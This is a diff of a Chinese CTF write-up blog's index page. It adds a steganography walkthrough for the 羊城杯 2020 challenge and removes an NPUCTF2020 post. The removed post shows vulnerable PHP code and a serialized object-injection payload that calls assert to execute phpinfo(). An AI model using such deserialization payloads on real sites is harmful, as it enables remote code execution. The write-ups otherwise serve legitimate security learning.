@@ -71,6 +71,65 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-88" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/29/page-88/" class="article-date">
+  <time class="dt-published" datetime="2021-07-29T10:25:22.000Z" itemprop="datePublished">2021-07-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/29/page-88/">羊城杯 2020逃离东南亚</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>三个压缩包日记1 无密码2 3 有<br>应该得一个个得到密码<br>日记1一个图片和文档（毫无意义的）<br>图片010 属性 stegsolve都没什么应该是crc校验问题高度问题改一下</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/102.PNG?raw=true" alt="102.PNG"></p>
+<p>日记2的文档这人是被骗去传销了吧 😨<br>test是brainfuck加密但是得在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首行加一串++++++++</span><br></pre></td></tr></table></figure>
+
+<p>才能解密成功</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/103.PNG?raw=true" alt="103.PNG"></p>
+<p>解密后是base64码再解密 看样子是elf格式的文件</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/104.PNG?raw=true" alt="104.PNG"></p>
+<p><strong>用kali将结果通过标准输出重定向成一个elf文件</strong><br>ida那边看一下有些东西感觉</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/105.PNG?raw=true" alt="105.PNG"></p>
+<p>这边这串看了别人的wp是正常的字这个是提示是lsb隐写</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/106.PNG?raw=true" alt="106.PNG"></p>
+<p>那应该是那个wav是lsb隐写 <strong>用silenteye将音频的内容解码出来</strong></p>
+<p>日记3的解压密码 <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/107.PNG?raw=true" alt="107.PNG"><br>这里头的文档看样子正常多了<br>因此通过源代码向外界发送求救信号是一个不错的方法</p>
+<p>但需要满足以下几个条件：</p>
+<ol>
+<li>加入代码隐写的部分不能影响源代码的编译</li>
+<li>不能很容易被公司审计专员看出来</li>
+<li>不能直接明文交流<br>这应该是提示</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/29/page-88/" data-id="ckrory30t00006kw70q8b2fb5" data-title="羊城杯 2020逃离东南亚" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-87" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/29/page-87/" class="article-date">
@@ -593,56 +652,6 @@
 
 
   
-    <article id="post-page-78" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/21/page-78/" class="article-date">
-  <time class="dt-published" datetime="2021-07-21T13:24:59.000Z" itemprop="datePublished">2021-07-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/21/page-78/">NPUCTF2020ReadlezPHP</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>黑不溜秋一片<br>查看源码发现<strong>另一个页面 /time.php?source</strong><br>然后就给了源码了</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>@$ppp = unserialize($_GET[“data”]);<br>老熟人了序列化<br>@$ppp = unserialize($_GET[“data”]);  这边是传参数的地方<br><strong>这边$b($a) 因为这个,可以利用php动态调用函数，拿取flag</strong>。<br>这边要用到assert()函数  构成一个 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert(phpinfo())  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/63.PNG?raw=true" alt="63.PNG"></p>
-<p>构造如下序列化 用phpstudy</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;phpinfo()&quot;;</span><br><span class="line">        $this-&gt;b = &quot;assert&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp();</span><br><span class="line">var_dump(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>生成：O:8:”HelloPhp”:2:{s:1:”a”;s:9:”phpinfo()”;s:1:”b”;s:6:”assert”;}</strong><br>payload： ?data=O:8:”HelloPhp”:2:{s:1:”a”;s:9:”phpinfo()”;s:1:”b”;s:6:”assert”;} 就可以了</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/64.PNG?raw=true" alt="64.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/21/page-78/" data-id="ckroqtfm8001jyww73obg6s2j" data-title="NPUCTF2020ReadlezPHP" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -679,6 +688,10 @@
       <ul>
         
           <li>
+            <a href="/2021/07/29/page-88/">羊城杯 2020逃离东南亚</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/29/page-87/">GWCTF 2019枯燥的抽奖</a>
           </li>
         
@@ -692,10 +705,6 @@
         
           <li>
             <a href="/2021/07/29/page-84/">CISCN2019 华北赛区 Day1 Web2ikun</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/29/page-83/">MRCTF2020套娃</a>
           </li>
         
       </ul>
